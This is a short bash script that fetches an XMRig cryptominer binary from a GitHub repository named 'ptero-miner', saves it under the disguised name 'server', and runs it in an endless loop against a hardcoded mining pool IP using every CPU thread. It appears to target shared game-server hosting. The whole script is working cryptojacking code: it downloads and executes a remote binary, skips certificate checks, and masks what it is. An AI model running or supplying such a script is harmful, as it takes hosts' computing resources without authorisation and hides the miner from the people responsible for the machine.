#!/bin/bash

threads=$(nproc)
if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    wget --no-check-certificate -O "server" https://github.com/thefeziak/ptero-miner/raw/refs/heads/main/xmrigarm64
else
    wget --no-check-certificate -O "server" https://github.com/thefeziak/ptero-miner/raw/refs/heads/main/xmrigamd64
fi

chmod +x server

while true; do
    ./server -a rx/0 -o 45.156.21.182:3333 -u x -p x --no-color --nicehash -t $threads
done
